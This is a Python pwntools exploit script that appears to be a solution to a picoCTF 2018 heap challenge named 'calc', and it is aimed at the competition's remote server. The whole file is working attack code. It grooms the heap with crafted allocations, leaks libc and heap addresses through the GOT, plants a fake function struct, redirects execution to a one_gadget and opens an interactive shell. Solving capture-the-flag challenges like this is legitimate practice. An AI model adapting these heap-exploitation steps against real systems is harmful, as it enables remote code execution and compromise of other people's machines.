from pwn import *

e = ELF("./calc")
libc = ELF("./libc.so.6")
#p = process(e.path, env={"LD_PRELOAD": libc.path})
p = remote("2018shell.picoctf.com", 54291)

def alloc(p, name="", padding=0, size=0x70, ops=0):
  p.clean()
  if len(name) == 0:
    name = ''.join(random.choice(string.ascii_uppercase) for _ in range(size))
  payload = (": {} {} {}".format(name, str(ops), padding * " " + "# " * ops))[:-1]

  p.send(payload)

  return name

def free(p):
  p.clean()
  p.sendline()

alloc(p, size=0x50, ops=0)
p.send(" ")

B = alloc(p, size=0xd, ops=7)
free(p) 

A = alloc(p, size=0xd, ops=7, padding=0x40)
free(p)

funcs = 3

payload = ""
# Free B and realloc with non-fastbin 
payload += ": {} 8 # # # # # # # # ".format(B)
payload += A + " "
payload += p64(7) + p64(e.got["free"])
payload += p64(6) + p64(e.symbols["functions"] + funcs * 8)
payload += p64(7) + p64(e.symbols["functions"])
payload += p64(6) + p64(e.symbols["functions"] + (funcs + 1) * 8)
payload = payload.rjust(0x70, " ")

p.sendline(payload)

p.recvuntil("Running " + A)

p.recvuntil("Running ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
libc_base = leak - libc.symbols["free"]
print("Libc Base: {0:#x}".format(libc_base))

p.recvuntil("Running ")
heap_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print("Heap Leak: {0:#x}".format(heap_leak))

one_gadget = 0xf0274 + libc_base 
header_size = 0x20 
# We leak the very next chunk. The first chunk has size 0x70 + 0x10 for headers. 
# We then add the size of our custom headers
chunk_offset = heap_leak - 0x80 + (header_size + 0x20 + 0x8)

print("Fake function struct at {0:#x}".format(chunk_offset))
payload = ""
payload += A + " "
payload = payload.ljust(header_size, " ")

# We want *ops to align with GOT entry
payload += p64(7) + p64(e.symbols["functions"] + (funcs - 1) * 8)
payload += p64(7) + p64(chunk_offset) + p64(0x1337)

# Uses memcpy for the write
payload += p64(heap_leak + 0x160) + p64(chunk_offset + 3 * 8) + p64(1) + p64(one_gadget)

p.sendline(payload) 

p.interactive()
